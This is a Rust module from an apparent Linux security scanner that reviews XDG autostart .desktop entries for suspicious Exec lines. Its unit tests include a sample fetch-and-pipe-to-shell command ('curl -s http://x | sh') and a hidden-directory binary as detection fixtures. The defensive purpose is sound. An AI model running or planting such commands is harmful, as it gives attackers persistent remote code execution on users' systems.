//! XDG autostart entries.

use std::path::{Path, PathBuf};

use super::{finish, logical_lines, review_fix, snip};
use crate::ctx::Ctx;
use crate::finding::{Acc, Finding, Severity};
use crate::patterns;
use crate::pkg::Ownership;

const NAME: &str = "autostart";

/// Returns None if the entry is disabled (Hidden=true / autostart disabled).
pub fn analyze_desktop(text: &str) -> Option<(Acc, Option<String>)> {
    let mut acc = Acc::default();
    let mut exec = None;
    let mut in_entry = false;
    for (ln, line) in logical_lines(text, &['#']) {
        if line.starts_with('[') {
            in_entry = line == "[Desktop Entry]";
            continue;
        }
        if !in_entry {
            continue;
        }
        let Some((k, v)) = line.split_once('=') else { continue };
        let (k, v) = (k.trim(), v.trim());
        match k {
            "Hidden" if v.eq_ignore_ascii_case("true") => return None,
            "X-GNOME-Autostart-enabled" if v.eq_ignore_ascii_case("false") => return None,
            "Exec" | "TryExec" => {
                if let Some(bin) = v.split_whitespace().next() {
                    if let Some((s, r)) = patterns::exec_location(bin) {
                        acc.add(s, format!("line {ln}: {r}"));
                    }
                }
                for h in patterns::scan(v) {
                    acc.add(h.sev, format!("line {ln}: {} [{}]", h.what, snip(v)));
                }
                if k == "Exec" {
                    exec = Some(v.to_string());
                }
            }
            _ => {}
        }
    }
    Some((acc, exec))
}

pub fn run(ctx: &Ctx) -> Vec<Finding> {
    let mut files: Vec<(PathBuf, bool)> = ctx.list(Path::new("/etc/xdg/autostart")).into_iter().map(|p| (p, true)).collect();
    for h in &ctx.homes {
        files.extend(ctx.list(&h.path.join(".config/autostart")).into_iter().map(|p| (p, false)));
    }
    let mut out = Vec::new();
    for (p, system) in files {
        if !p.to_string_lossy().ends_with(".desktop") {
            continue;
        }
        let Some(text) = ctx.read_text(&p) else { continue };
        let owner = if system { ctx.owner(&p) } else { Ownership::Unknown };
        ctx.record_file(&Ctx::key(NAME, &p), &p, matches!(owner, Ownership::Owned(_)));
        let Some((mut acc, exec)) = analyze_desktop(&text) else { continue };
        if !system {
            acc.add(Severity::Low, format!("user autostart entry runs at login: {}", snip(exec.as_deref().unwrap_or("(no Exec)"))));
        }
        if let Some(f) = finish(ctx, NAME, &p, acc, &owner, system.then_some(Severity::Med), |_| review_fix(ctx, &p)) {
            out.push(f);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn desktop_parsing() {
        let (a, e) = analyze_desktop("[Desktop Entry]\nType=Application\nExec=/usr/bin/nm-applet\n").unwrap();
        assert!(a.is_empty());
        assert_eq!(e.as_deref(), Some("/usr/bin/nm-applet"));
        assert!(analyze_desktop("[Desktop Entry]\nExec=/tmp/x\nHidden=true\n").is_none());
        let (a, _) = analyze_desktop("[Desktop Entry]\nExec=sh -c \"curl -s http://x | sh\"\n").unwrap();
        assert_eq!(a.sev, Some(Severity::High));
        let (a, _) = analyze_desktop("[Desktop Entry]\nExec=/home/u/.config/.upd/u\n").unwrap();
        assert_eq!(a.sev, Some(Severity::Med));
    }
}
